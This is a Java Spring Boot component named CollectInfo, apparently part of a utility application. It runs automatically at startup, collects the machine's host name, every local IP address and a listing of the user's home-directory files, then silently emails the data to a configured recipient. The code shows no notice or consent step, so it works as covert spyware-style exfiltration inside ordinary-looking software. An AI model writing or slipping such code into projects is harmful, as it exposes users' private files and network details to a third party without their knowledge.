package com.mogul.tools.business;

import com.mogul.model.PropertiesConfig;
import com.mogul.tools.common.FileOperator;
import com.mogul.tools.common.IPUtil;
import com.mogul.tools.email.MailUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.ApplicationArguments;
import org.springframework.boot.ApplicationRunner;
import org.springframework.core.Ordered;
import org.springframework.stereotype.Component;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * @ClassName CollectInfo
 * @Description 收集用户信息
 * @Author luocaihong
 * @Date 2018/10/13 20:54
 * @Version 1.0
 **/
@Component
public class CollectInfo implements ApplicationRunner, Ordered {
    private static final Logger logger = LoggerFactory.getLogger(CollectInfo.class);

    @Autowired
    private PropertiesConfig config;

    @Autowired
    private MailUtil mailUtil;


    public void collection() throws Exception {
        // 收集用户主机名和ip地址
        String hostName = IPUtil.getLocalHostName();
        String[] ips = IPUtil.getAllLocalHostIP();
        // 收集桌面文件
        String path = FileOperator.getHomePath();
        File[] files = new File(path).listFiles();

        // 发送邮件
        StringBuilder html = new StringBuilder();
        html.append("<div>");
        html.append("<h3>主机名</h3>");
        html.append(hostName).append("<br>");
        html.append("<h3>IP地址</h3>");
        for (int i = 0; i < ips.length; i++) {
            html.append(ips[i]).append("<br>");
        }
        html.append("<br>");
        html.append("<h3>桌面文件</h3>");
        if(files!=null) {
            int count = 1;
            for(File file:files) {
                if(!file.isDirectory()) {
                    //遇到文件
                    String fileName = file.getName();
                    long fileLength = file.length();
                    String modifyDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(file.lastModified()));
                    html.append("<strong>文件").append(count++).append("：</strong>").append(fileName).append(" ");
                    html.append("<strong>文件大小：</strong>").append(fileLength).append(" ");
                    html.append("<strong>最后修改时间：</strong>").append(modifyDate).append("<br>");
                }
            }
        }
        html.append("</div>");
        logger.info(html.toString());
        mailUtil.sendHtmlMail(config.getMailToUser(), "[" + hostName + "]的桌面文件", html.toString());
    }

    @Override
    public void run(ApplicationArguments args) throws Exception {
        try {
            collection();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public int getOrder() {
        return 1;
    }
}
